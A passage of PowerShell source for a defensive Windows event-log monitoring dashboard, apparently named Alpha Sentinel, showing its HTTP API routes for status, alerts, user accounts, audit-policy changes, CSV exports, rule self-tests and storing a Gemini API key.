        $res.Headers.Add('Set-Cookie', 'sentinel_session=; Path=/; HttpOnly; SameSite=Strict; Max-Age=0')
        Write-AuthEvent $clientIp $who 'logout' 'session destroyed'
        Send-Json $res '{"ok":true}'
      }
      '^/api/session$' {
        $s = Get-Session (Get-SessionIdFromContext $ctx)
        $store = Get-UserStore
        $rec = Get-UserRecord $store "$($s.User)"
        Send-Json $res (@{
          ok          = $true
          user        = "$($s.User)"
          sessionHours = $Script:SessionHours
          idleMinutes  = $Script:IdleMinutes
          avatarColor    = if ($rec -and $rec.avatarColor) { "$($rec.avatarColor)" } else { '' }
          avatarInitials = if ($rec -and $rec.avatarInitials) { "$($rec.avatarInitials)" } else { '' }
        } | ConvertTo-Json)
      }
      '^/api/health$' {
        # A liveness probe, nothing more: no counters, no channel names, no
        # timings, no version. Everything an operator or a dashboard needs is on
        # the authenticated /api/status below, so an unauthenticated caller
        # learns only that something is listening.
        Send-Json $res '{"ok":true}'
      }
      '^/api/status$' {
        # Authenticated (it is not in the public list above). This is what the
        # dashboard reads: counts, per-channel lag and error counters.
        $nonSelfTest = @($Script:Alerts | Where-Object { -not $_.SelfTest }).Count
        $now = Get-Date
        $channels = @()
        $lagMax = 0
        foreach ($c in @($Script:ChannelMarks.Keys)) {
          $mark = $Script:ChannelMarks[$c]
          $lag = [int][Math]::Round(($now - $mark).TotalSeconds)
          if ($lag -gt $lagMax) { $lagMax = $lag }
          $ls = $Script:ChannelLastSuccess[$c]
          $channels += [PSCustomObject]@{
            channel      = $c
            lagSeconds   = $lag
            lastSuccess  = if ($ls) { $ls.ToUniversalTime().ToString("o") } else { $null }
            lastError    = "$($Script:ChannelLastError[$c])"
            xpathBlocked = [bool]($Script:XPathFallback[$c])
          }
        }
        $uptime = 0
        if ($Script:StartedAt) { $uptime = [int][Math]::Round(($now - $Script:StartedAt).TotalSeconds) }
        $catch = Get-CatchUpState $lagMax
        Send-Json $res (@{
          ok                  = $true
          alerts              = $nonSelfTest
          selfTestAlerts      = $Script:SelfTestAlerts
          rules               = $RuleMeta.Count
          usersConfigured     = @(Get-UserStore | ForEach-Object { $_.users }).Count
          sessions            = @($Script:Sessions.Keys).Count
          pollSeconds         = $PollSeconds
          lagSeconds          = $lagMax
          catchingUp          = $catch.catchingUp
          catchingUpThreshold = $catch.threshold
          lastPollCapped      = $catch.capped
          lagWarning          = ($lagMax -gt 120)
          evalErrors          = $Script:EvalErrors
          pollErrors          = $Script:PollErrors
          bodyRejections      = $Script:BodyRejections
          bodyTimeouts        = $Script:BodyTimeouts
          lastEvalError       = "$($Script:LastEvalError)"
          lastPollError       = "$($Script:LastPollError)"
          channels            = $channels
          forwarded           = $Script:Forwarded
          forwardingErrors    = $Script:ForwardFailures
          auditBlind          = @(Get-RuleCatalog | Where-Object { $_.auditState -eq 'blind' }).Count
          uptimeSeconds       = $uptime
        } | ConvertTo-Json -Depth 4)
      }
      # ---- v2.3 read-only dashboard API (GET, session required, JSON) --------
      '^/api/assets$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        $as = Get-AssetsPayload $ctx.Request.QueryString
        if ($as.error) { Send-Json $res ('{"error":"' + $as.error + '"}') $as.status; return }
        Send-Json $res ('{"assets":' + (ConvertTo-JsonArray $as.assets) +
                        ',"count":' + $as.count + ',"total":' + $as.total + ',"limit":' + $as.limit + ',"kind":"' + $as.kind + '"}')
      }
      '^/api/assets/(host|account|ip)/(.+)$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        # the id is looked up IN THE MAP - it never becomes a path or a regex
        $detail = Get-AssetDetail $Matches[1] ([uri]::UnescapeDataString("$($Matches[2])"))
        if ($detail.error) { Send-Json $res ('{"error":"' + $detail.error + '"}') $detail.status; return }
        Send-Json $res (('{"asset":' + ($detail.asset | ConvertTo-Json -Depth 6) +
                         ',"timeline":' + (ConvertTo-JsonArray $detail.timeline) + '}'))
      }
      '^/api/report$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        $rp = Get-ReportPayload $ctx.Request.QueryString
        if ($rp.error) { Send-Json $res ('{"error":"' + $rp.error + '"}') $rp.status; return }
        Send-Json $res ($rp | ConvertTo-Json -Depth 6)
      }
      '^/api/chains$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        Send-Json $res (ConvertTo-JsonArray (Get-AttackChains))
      }
      '^/api/paths$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        Send-Json $res ((Get-AttackPathsPayload) | ConvertTo-Json -Depth 6)
      }
      '^/api/overview$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        Send-Json $res ((Get-OverviewPayload) | ConvertTo-Json -Depth 6)
      }
      '^/api/events$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        $ev = Get-EventsPayload $ctx.Request.QueryString
        if ($ev.error) { Send-Json $res ('{"error":"' + $ev.error + '"}') $ev.status; return }
        Send-Json $res ('{"events":' + (ConvertTo-JsonArray $ev.events) +
                        ',"count":' + $ev.count + ',"total":' + $ev.total + ',"limit":' + $ev.limit + '}')
      }
      '^/api/hosts$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        Send-Json $res (ConvertTo-JsonArray (Get-HostsPayload))
      }
      '^/api/settings$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        Send-Json $res ((Get-SettingsPayload) | ConvertTo-Json -Depth 6)
      }
      '^/api/settings/gemini-key/status$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - this endpoint is read-only (GET)."}' 405; return }
        $geminiKeyFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-gemini.key" } else { "sentinel-gemini.key" }
        $keySet = (Test-Path $geminiKeyFile)
        Send-Json $res (@{ keySet = $keySet } | ConvertTo-Json)
      }
      '^/api/alerts$' {
        # No query string -> serve the cached payload (rebuilt only when an
        # alert actually changed). ?selfTest=0|1, ?limit=N and ?since=ID are for
        # API clients that want a slice.
        $qs = $ctx.Request.QueryString
        if ($qs.Count -eq 0) {
          if ($Script:AlertsDirty) {
            $Script:AlertsJson = ConvertTo-JsonArray (Get-AlertRows)
            $Script:AlertsDirty = $false
          }
          Send-Json $res $Script:AlertsJson
        } else {
          $rows = @(Get-AlertRows)
          if ("$($qs['selfTest'])" -eq '0') { $rows = @($rows | Where-Object { -not $_.SelfTest }) }
          if ("$($qs['selfTest'])" -eq '1') { $rows = @($rows | Where-Object { $_.SelfTest }) }
          $limText = "$($qs['limit'])"
          if ($limText) {
            $lim = 0
            [void][int]::TryParse($limText, [ref]$lim)
            if ($lim -gt 0 -and $rows.Count -gt $lim) { $rows = @($rows | Select-Object -Last $lim) }
          }
          $sinceText = "$($qs['since'])"
          if ($sinceText) {
            $sinceId = 0
            [void][int]::TryParse($sinceText, [ref]$sinceId)
            if ($sinceId -gt 0) { $rows = @($rows | Where-Object { $_.Id -gt $sinceId }) }
          }
          Send-Json $res (ConvertTo-JsonArray $rows)
        }
      }
      '^/api/rules$' {
        $rules = @(Get-RuleCatalog | Sort-Object @{ e = { $SevRank[$_.severity] } }, title)
        $firedTotal = @($rules | Where-Object { $_.fired -gt 0 }).Count
        $eventIds = @($rules | ForEach-Object { $_.eventIds } | Select-Object -Unique)
        $blind = @($rules | Where-Object { $_.auditState -eq 'blind' })
        $payload = '{"rules":' + (ConvertTo-JsonArray $rules) +
                   ',"total":' + $rules.Count +
                   ',"firedTotal":' + $firedTotal +
                   ',"monitoredEventIds":' + (ConvertTo-JsonArray @($eventIds)) +
                   ',"auditBlind":' + $blind.Count +
                   ',"auditUnknown":' + @($rules | Where-Object { $_.auditState -eq 'unknown' }).Count +
                   ',"auditCheckedAt":' + ($Script:AuditCheckedAt | ConvertTo-Json) +
                   '}'
        Send-Json $res $payload
      }
      '^/api/preflight$' {
        Send-Json $res ((Get-PreflightReport) | ConvertTo-Json -Depth 6)
      }
      '^/api/preflight/refresh$' {
        $null = Update-AuditPreflight
        $Script:AlertsDirty = $true
        Send-Json $res ((Get-PreflightReport) | ConvertTo-Json -Depth 6)
      }
      '^/api/alerts/(\d+)/ack$' {
        $null = $bodyParsed   # the body was read (and drained) above
        $alert = $Script:Alerts | Where-Object { $_.Id -eq [int]$Matches[1] } | Select-Object -First 1
        if ($alert) {
          $alert.Acknowledged = $true
          $Script:AlertsDirty = $true
          Save-History
          Send-Json $res '{"ok":true,"acknowledged":true}'
        } else { Send-Json $res '{"error":"Alert not found."}' 404 }
      }
      '^/api/alerts/(\d+)/unack$' {
        $null = $bodyParsed   # the body was read (and drained) above
        $alert = $Script:Alerts | Where-Object { $_.Id -eq [int]$Matches[1] } | Select-Object -First 1
        if ($alert) {
          $alert.Acknowledged = $false
          $Script:AlertsDirty = $true
          Save-History
          Send-Json $res '{"ok":true,"acknowledged":false}'
        } else { Send-Json $res '{"error":"Alert not found."}' 404 }
      }
      '^/api/alerts/(\d+)/status$' {
        # Triage: status + investigation notes. Separate from Ack (which
        # just means "a human has seen this row") - Status is the actual
        # investigation state, same vocabulary as the web platform.
        $id = [int]$Matches[1]
        $alert = $Script:Alerts | Where-Object { $_.Id -eq $id } | Select-Object -First 1
        if (-not $alert) {
          Send-Json $res '{"error":"Alert not found."}' 404
        } else {
          $body = $bodyParsed   # read once, above
          if ($body) {
            if ($body.status -and ($AlertStatuses -contains "$($body.status)")) {
              $alert.Status = "$($body.status)"
            }
            if ($null -ne $body.notes) {
              $notes = "$($body.notes)"
              $alert.Notes = $notes.Substring(0, [Math]::Min(4000, $notes.Length))
            }
            $Script:AlertsDirty = $true
          }
          Save-History
          Send-Json $res (@{ ok = $true; id = $id; status = $alert.Status; notes = $alert.Notes } | ConvertTo-Json)
        }
      }
      # ---- Settings > Account / Users (v2.5) ---------------------------------
      # Every route here: session required (the global gate), POST for changes,
      # same-origin (checked below per route), re-auth with a real password,
      # and auth-logged. Passwords and hashes never appear in a response or log.
      '^/api/account/password$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $sid = Get-SessionIdFromContext $ctx
        $sess = Get-Session $sid
        if (-not $sess) { Send-Json $res '{"error":"Not signed in."}' 401; return }
        $me = "$($sess.User)"
        $body = $bodyParsed
        $current = if ($body -and $null -ne $body.current) { "$($body.current)" } else { '' }
        $new = if ($body -and $null -ne $body.new) { "$($body.new)" } else { '' }
        if (-not $current -or -not $new) {
          Write-AuthEvent $clientIp $me 'failure' 'password change: missing fields'
          Send-Json $res '{"error":"Current and new password are required."}' 400
          return
        }
        # a failed 'current' IS a login failure for this address
        if (-not (Test-LoginAllowed $clientIp)) {
          $retry = Get-LoginRetryAfter $clientIp
          try { $res.Headers.Add('Retry-After', "$retry") } catch { }
          Write-AuthEvent $clientIp $me 'blocked' "rate limited, $retry s remaining"
          Send-Json $res '{"error":"Too many failed attempts from this address. Try again in a few minutes."}' 429
          return
        }
        if (-not (Test-UserPassword $me $current)) {
          $rec = Register-LoginFailure $clientIp
          Write-AuthEvent $clientIp $me 'failure' "password change: wrong current password (failure $($rec.Count) in window)"
          Send-Json $res '{"error":"The current password is not correct."}' 403
          return
        }
        if ($new.Length -lt 12) {
          Write-AuthEvent $clientIp $me 'failure' 'password change: new password too short'
          Send-Json $res '{"error":"The new password must be at least 12 characters."}' 400
          return
        }
        if ($new -ceq $me) {
          Write-AuthEvent $clientIp $me 'failure' 'password change: new password equals the username'
          Send-Json $res '{"error":"The new password must not be your username."}' 400
          return
        }
        if ($new -ceq $current) {
          Write-AuthEvent $clientIp $me 'failure' 'password change: new password equals the current one'
          Send-Json $res '{"error":"The new password must differ from the current one."}' 400
          return
        }
        # rewrite the record, end every OTHER session of this user, rotate mine
        $null = Set-UserPassword $me $new $Script:Pbkdf2Iterations
        $others = 0
        foreach ($id2 in @($Script:Sessions.Keys)) {
          if ($id2 -ne $sid -and "$($Script:Sessions[$id2].User)" -eq $me) {
            $Script:Sessions.Remove($id2)
            $others++
          }
        }
        # my session keeps running, under a fresh id, re-stamped to the new record
        $newSid = New-Session $me
        Remove-Session $sid
        Write-AuthEvent $clientIp $me 'success' ("password changed; " + $others + " other session(s) ended")
        $res.Headers.Add('Set-Cookie', "sentinel_session=$newSid; Path=/; HttpOnly; SameSite=Strict")
        Send-Json $res (@{ ok = $true; sessionsEnded = $others } | ConvertTo-Json)
      }
      '^/api/account/username$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $sid = Get-SessionIdFromContext $ctx
        $sess = Get-Session $sid
        if (-not $sess) { Send-Json $res '{"error":"Not signed in."}' 401; return }
        $me = "$($sess.User)"
        $body = $bodyParsed
        $password = if ($body -and $null -ne $body.password) { "$($body.password)" } else { '' }
        $newName = if ($body -and $null -ne $body.newName) { "$($body.newName)" } else { '' }
        if (-not $password -or -not $newName) {
          Write-AuthEvent $clientIp $me 'failure' 'username change: missing fields'
          Send-Json $res '{"error":"Password and new name are required."}' 400
          return
        }
        if (-not (Test-LoginAllowed $clientIp)) {
          $retry = Get-LoginRetryAfter $clientIp
          try { $res.Headers.Add('Retry-After', "$retry") } catch { }
          Send-Json $res '{"error":"Too many failed attempts from this address. Try again in a few minutes."}' 429
          return
        }
        if (-not (Test-UserPassword $me $password)) {
          $rec = Register-LoginFailure $clientIp
          Write-AuthEvent $clientIp $me 'failure' "username change: wrong password (failure $($rec.Count) in window)"
          Send-Json $res '{"error":"The password is not correct."}' 403
          return
        }
        if ($newName -notmatch '^[A-Za-z0-9._-]{3,32}$') {
          Write-AuthEvent $clientIp $me 'failure' 'username change: invalid name'
          Send-Json $res '{"error":"The name must be 3-32 characters of A-Z, a-z, 0-9, dot, underscore or hyphen."}' 400
          return
        }
        $store = Get-UserStore
        $nameTaken = $false
        foreach ($u in @($store.users)) {
          if ("$($u.user)" -ne $me -and "$($u.user)".ToLower() -eq $newName.ToLower()) { $nameTaken = $true }
        }
        if ($nameTaken) {
          Write-AuthEvent $clientIp $me 'failure' 'username change: name already in use'
          Send-Json $res '{"error":"That name is already in use."}' 409
          return
        }
        $null = Rename-User $me $newName
        # my session continues under the new name: re-point it and rotate the id
        $newSid = New-Session $newName
        Remove-Session $sid
        Write-AuthEvent $clientIp $newName 'success' ("username changed from " + $me)
        $res.Headers.Add('Set-Cookie', "sentinel_session=$newSid; Path=/; HttpOnly; SameSite=Strict")
        Send-Json $res (@{ ok = $true; user = $newName } | ConvertTo-Json)
      }
      '^/api/users$' {
        if ($method -eq 'GET') {
          Send-Json $res (ConvertTo-JsonArray (Get-UsersPayload (Get-SessionUser $ctx)))
          return
        }
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - GET to read, POST to create."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $me = Get-SessionUser $ctx
        $body = $bodyParsed
        $password = if ($body -and $null -ne $body.password) { "$($body.password)" } else { '' }
        $newName = if ($body -and $null -ne $body.name) { "$($body.name)" } else { '' }
        $newPass = if ($body -and $null -ne $body.newPassword) { "$($body.newPassword)" } else { '' }
        if (-not $password -or -not $newName -or -not $newPass) {
          Write-AuthEvent $clientIp $me 'failure' 'user create: missing fields'
          Send-Json $res '{"error":"Your password, the new name and a password for it are required."}' 400
          return
        }
        if (-not (Test-LoginAllowed $clientIp)) {
          Send-Json $res '{"error":"Too many failed attempts from this address. Try again in a few minutes."}' 429
          return
        }
        if (-not (Test-UserPassword $me $password)) {
          $rec = Register-LoginFailure $clientIp
          Write-AuthEvent $clientIp $me 'failure' "user create: wrong caller password (failure $($rec.Count) in window)"
          Send-Json $res '{"error":"Your password is not correct."}' 403
          return
        }
        if ($newName -notmatch '^[A-Za-z0-9._-]{3,32}$') {
          Send-Json $res '{"error":"The name must be 3-32 characters of A-Z, a-z, 0-9, dot, underscore or hyphen."}' 400
          return
        }
        if ($newPass.Length -lt 12) {
          Send-Json $res '{"error":"The password must be at least 12 characters."}' 400
          return
        }
        $store = Get-UserStore
        foreach ($u in @($store.users)) {
          if ("$($u.user)".ToLower() -eq $newName.ToLower()) {
            Send-Json $res '{"error":"That name is already in use."}' 409
            return
          }
        }
        $null = Add-User $newName $newPass
        Write-AuthEvent $clientIp $me 'success' ("user created: " + $newName)
        Send-Json $res (@{ ok = $true; name = $newName } | ConvertTo-Json)
      }
      '^/api/users/([^/]+)/reset$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $me = Get-SessionUser $ctx
        # the target is a LIST lookup, never a path
        $target = [uri]::UnescapeDataString($Matches[1])
        $body = $bodyParsed
        $password = if ($body -and $null -ne $body.password) { "$($body.password)" } else { '' }
        $newPass = if ($body -and $null -ne $body.newPassword) { "$($body.newPassword)" } else { '' }
        if (-not $password -or -not $newPass) {
          Write-AuthEvent $clientIp $me 'failure' 'user reset: missing fields'
          Send-Json $res '{"error":"Your password and the new password are required."}' 400
          return
        }
        if (-not (Test-LoginAllowed $clientIp)) {
          Send-Json $res '{"error":"Too many failed attempts from this address. Try again in a few minutes."}' 429
          return
        }
        if (-not (Test-UserPassword $me $password)) {
          $rec = Register-LoginFailure $clientIp
          Write-AuthEvent $clientIp $me 'failure' "user reset: wrong caller password (failure $($rec.Count) in window)"
          Send-Json $res '{"error":"Your password is not correct."}' 403
          return
        }
        if ($newPass.Length -lt 12) {
          Send-Json $res '{"error":"The password must be at least 12 characters."}' 400
          return
        }
        $store = Get-UserStore
        $targetRecord = $null
        foreach ($u in @($store.users)) { if ("$($u.user)" -eq $target) { $targetRecord = $u } }
        if (-not $targetRecord) { Send-Json $res '{"error":"No such user."}' 404; return }
        $null = Set-UserPassword $target "$newPass" $Script:Pbkdf2Iterations
        $ended = Revoke-UserSessions $target
        Write-AuthEvent $clientIp $me 'success' ("password reset for " + $target + " by " + $me + "; " + $ended + " session(s) ended")
        Send-Json $res (@{ ok = $true; sessionsEnded = $ended } | ConvertTo-Json)
      }
      '^/api/users/([^/]+)/remove$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $me = Get-SessionUser $ctx
        $target = [uri]::UnescapeDataString($Matches[1])
        $body = $bodyParsed
        $password = if ($body -and $null -ne $body.password) { "$($body.password)" } else { '' }
        if (-not $password) {
          Write-AuthEvent $clientIp $me 'failure' 'user remove: missing password'
          Send-Json $res '{"error":"Your password is required."}' 400
          return
        }
        if ($target -eq $me) {
          Write-AuthEvent $clientIp $me 'failure' 'user remove: refused (cannot remove yourself)'
          Send-Json $res '{"error":"You cannot remove the account you are signed in with."}' 400
          return
        }
        if (-not (Test-LoginAllowed $clientIp)) {
          Send-Json $res '{"error":"Too many failed attempts from this address. Try again in a few minutes."}' 429
          return
        }
        if (-not (Test-UserPassword $me $password)) {
          $rec = Register-LoginFailure $clientIp
          Write-AuthEvent $clientIp $me 'failure' "user remove: wrong caller password (failure $($rec.Count) in window)"
          Send-Json $res '{"error":"Your password is not correct."}' 403
          return
        }
        $store = Get-UserStore
        $targetRecord = $null
        foreach ($u in @($store.users)) { if ("$($u.user)" -eq $target) { $targetRecord = $u } }
        if (-not $targetRecord) { Send-Json $res '{"error":"No such user."}' 404; return }
        if (@($store.users).Count -le 1) {
          Write-AuthEvent $clientIp $me 'failure' 'user remove: refused (last user)'
          Send-Json $res '{"error":"The last account cannot be removed - the dashboard would have nothing to authenticate against."}' 400
          return
        }
        $null = Remove-UserRecord $target
                $ended = Revoke-UserSessions $target
                $msg = "user removed: " + $target + "; " + $ended + " session(s) ended"
                Write-AuthEvent $clientIp $me 'success' $msg
        Send-Json $res (@{ ok = $true; sessionsEnded = $ended } | ConvertTo-Json)
      }
      '^/api/account/avatar$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $me = Get-SessionUser $ctx
        $body = $bodyParsed
        $color = if ($body -and $null -ne $body.color) { "$($body.color)" } else { '' }
        $initials = if ($body -and $null -ne $body.initials) { "$($body.initials)" } else { '' }
        $initials = $initials.ToUpper()
        if (-not (Test-AvatarColor $color)) {
          Send-Json $res '{"error":"Pick one of the palette colours."}' 400
          return
        }
        if (-not (Test-AvatarInitials $initials)) {
          Send-Json $res '{"error":"Initials are 1-2 characters of A-Z or 0-9."}' 400
          return
        }
        $null = Set-UserAvatar $me $color $initials
        Write-AuthEvent $clientIp $me 'success' 'avatar updated'
        Send-Json $res (@{ ok = $true; color = $color; initials = $initials } | ConvertTo-Json)
      }
      # ---- Settings > Audit (v2.5) -------------------------------------------
      '^/api/audit$' {
        if ($method -ne 'GET') { Send-Json $res '{"error":"Method not allowed - GET only."}' 405; return }
        $me = Get-SessionUser $ctx
        $rules = @(Get-RuleCatalog | Sort-Object key | ForEach-Object {
          [PSCustomObject]@{
            key = $_.key
            title = $_.title
            state = $_.auditState
            subcategory = $_.auditSubcategory
            need = $_.auditRequired
            detail = $_.auditDetail
          }
        })
        Send-Json $res (@{
          rules    = $rules
          elevated = (Test-ProcessElevated)
          lastChange = (Get-LastAuditChange)
          backups  = (Get-AuditBackups)
        } | ConvertTo-Json -Depth 4)
      }
      '^/api/audit/preview$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        # preview changes NOTHING by design; it still takes a session (the global gate).
        # ConvertTo-JsonArray, not raw ConvertTo-Json: an empty result through a
        # function is $null and UTF8.GetBytes($null) is the 500 this used to be.
        Send-Json $res (ConvertTo-JsonArray (Get-AuditChangePreview))
      }
      '^/api/audit/apply$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $me = Get-SessionUser $ctx
        if (-not (Test-ProcessElevated)) {
          Write-AuthEvent $clientIp $me 'failure' 'audit apply: not elevated'
          Send-Json $res '{"error":"Run Sentinel as Administrator to change the audit policy."}' 409
          return
        }
        $body = $bodyParsed
        $password = if ($body -and $null -ne $body.password) { "$($body.password)" } else { '' }
        if (-not $password) {
          Write-AuthEvent $clientIp $me 'failure' 'audit apply: missing password'
          Send-Json $res '{"error":"Your password is required."}' 400
          return
        }
        if (-not (Test-LoginAllowed $clientIp)) {
          Send-Json $res '{"error":"Too many failed attempts from this address. Try again in a few minutes."}' 429
          return
        }
        if (-not (Test-UserPassword $me $password)) {
          $rec = Register-LoginFailure $clientIp
          Write-AuthEvent $clientIp $me 'failure' "audit apply: wrong password (failure $($rec.Count) in window)"
          Send-Json $res '{"error":"Your password is not correct."}' 403
          return
        }
        $ok = Invoke-AuditPolicyApply $me $clientIp
        if ($ok) {
          Send-Json $res (@{ ok = $true; changes = (Get-AuditChangePreview).Count } | ConvertTo-Json)
        } else {
          Send-Json $res '{"error":"The audit policy could not be read or changed - see the console."}' 500
        }
      }
      '^/api/audit/restore$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $me = Get-SessionUser $ctx
        if (-not (Test-ProcessElevated)) {
          Write-AuthEvent $clientIp $me 'failure' 'audit restore: not elevated'
          Send-Json $res '{"error":"Run Sentinel as Administrator to change the audit policy."}' 409
          return
        }
        $body = $bodyParsed
        $password = if ($body -and $null -ne $body.password) { "$($body.password)" } else { '' }
        $backup = if ($body -and $null -ne $body.backup) { "$($body.backup)" } else { '' }
        if (-not $password -or -not $backup) {
          Write-AuthEvent $clientIp $me 'failure' 'audit restore: missing fields'
          Send-Json $res '{"error":"Your password and a backup name are required."}' 400
          return
        }
        # a NAME, never a path: it must be one of the files this tool created
        if ($backup -ne [IO.Path]::GetFileName($backup) -or $backup -notmatch '^sentinel-audit-backup-[0-9]{8}-[0-9]{6}\.csv$' -or ((Get-AuditBackups) -notcontains $backup)) {
          Write-AuthEvent $clientIp $me 'failure' ("audit restore: refused backup name " + $backup)
          Send-Json $res '{"error":"That is not a backup this tool created."}' 400
          return
        }
        if (-not (Test-LoginAllowed $clientIp)) {
          Send-Json $res '{"error":"Too many failed attempts from this address. Try again in a few minutes."}' 429
          return
        }
        if (-not (Test-UserPassword $me $password)) {
          $rec = Register-LoginFailure $clientIp
          Write-AuthEvent $clientIp $me 'failure' "audit restore: wrong password (failure $($rec.Count) in window)"
          Send-Json $res '{"error":"Your password is not correct."}' 403
          return
        }
        $full = Join-Path $PSScriptRoot $backup
        $ok = Restore-SentinelAuditPolicy $full
        if ($ok) {
          Write-AuthEvent $clientIp $me 'success' ("audit policy restored from " + $backup)
          Send-Json $res '{"ok":true}'
        } else {
          Send-Json $res '{"error":"auditpol /restore failed - see the console."}' 500
        }
      }
      '^/api/coverage\.csv$' {
        # The detection coverage report - the rule catalog with per-rule
        # fired counts, ready to drop into the engagement write-up.
        $rules = @(Get-RuleCatalog | Sort-Object @{ e = { $SevRank[$_.severity] } }, title)
        $rows = $rules | Select-Object key, title, severity, category,
          @{ n = 'eventIds'; e = { ($_.eventIds -join ' ') } },
          mitre, dedupeMinutes, fired, lastFiredAt,
          auditState, auditSubcategory, auditRequired, auditDetail,
          @{ n = 'description'; e = { Protect-CsvCell $_.description } },
          @{ n = 'remediation'; e = { Protect-CsvCell $_.remediation } }
        $tmp = [IO.Path]::GetTempFileName()
        $rows | Export-Csv -Path $tmp -NoTypeInformation -Force -Encoding UTF8
        $res.Headers.Add('Content-Disposition', 'attachment; filename="alpha-sentinel-coverage.csv"')
        Send-Bytes $res ([Text.Encoding]::UTF8.GetBytes((Get-Content -Raw $tmp))) 'text/csv; charset=utf-8'
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      }
      '^/api/export\.csv$' {
        $wantSelfTest = ("$($ctx.Request.QueryString['selfTest'])" -eq '1')
        $tmp = [IO.Path]::GetTempFileName()
        $null = Export-AlertsCsv $tmp $wantSelfTest
        $res.Headers.Add('Content-Disposition', 'attachment; filename="alpha-sentinel-alerts.csv"')
        Send-Bytes $res ([Text.Encoding]::UTF8.GetBytes((Get-Content -Raw $tmp))) 'text/csv; charset=utf-8'
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
      }
      '^/api/self-test$' {
        # Fires one synthetic event sequence per rule family through the REAL
        # rule engine - same code path and same thresholds as live polling - and
        # reports which families fired. The trackers are restored in a finally
        # block, so a probe that throws can no longer wipe the live windows, and
        # the alerts are tagged SelfTest so they stay out of the coverage counts
        # and out of the engagement CSV export.
        $null = $bodyParsed   # the body was read (and drained) above
        $savedTimes = $Script:RecentAlertTimes
        $savedWindows = $Script:Windows
        $savedDedupe = $Script:DedupeAlertId
        $fired = @()
        $firedAlerts = @()
        $probeError = ''
        try {
          $Script:RecentAlertTimes = @{}
          $Script:Windows = @{}
          $Script:DedupeAlertId = @{}
          foreach ($p in (New-SelfTestProbes)) {
            $shim = New-EventShim $p
            $alert = Evaluate-Event $shim
            if ($alert) {
              $alert.Description = "[SELF-TEST] $($alert.Description)"
              $alert.SelfTest = $true
              $Script:Alerts.Add($alert)
              $firedAlerts += $alert
              $fired += "$($alert.Severity): $($alert.Title)"
            }
          }
          if ($firedAlerts.Count -gt 0) {
            $Script:SelfTestAlerts += $firedAlerts.Count
            $Script:AlertsDirty = $true
            Save-History
          }
        } catch {
          $probeError = "$_"
        } finally {
          # ALWAYS put the live trackers back, even if a probe threw
          $Script:RecentAlertTimes = $savedTimes
          $Script:Windows = $savedWindows
          $Script:DedupeAlertId = $savedDedupe
        }

        $rulesExercised = @(New-SelfTestProbes | ForEach-Object { $_.ruleKey } | Select-Object -Unique).Count
        Send-Json $res (@{
          ok                = $true
          alertsFired       = $firedAlerts.Count
          rulesExercised    = $rulesExercised
          ruleFamiliesTotal = $RuleMeta.Count
          fired             = $fired
          error             = $probeError
        } | ConvertTo-Json -Depth 4)
      }
      '^/api/settings/gemini-key$' {
        if ($method -ne 'POST') { Send-Json $res '{"error":"Method not allowed - POST only."}' 405; return }
        if (-not (Test-SameOrigin $ctx)) { Send-Json $res '{"error":"Cross-origin request refused."}' 403; return }
        $me = Get-SessionUser $ctx
        $body = $bodyParsed
        $apiKey = if ($body -and $null -ne $body.apiKey) { "$($body.apiKey)" } else { '' }
        if (-not $apiKey) { Send-Json $res '{"error":"API key is required."}' 400; return }
        $geminiKeyFile = if ($PSScriptRoot) { Join-Path $PSScriptRoot "sentinel-gemini.key" } else { "sentinel-gemini.key" }
        $utf8Bom = New-Object System.Text.UTF8Encoding($true)
        [System.IO.File]::WriteAllText($geminiKeyFile, $apiKey, $utf8Bom)
        Write-AuthEvent $clientIp $me 'success' 'Gemini API key updated'
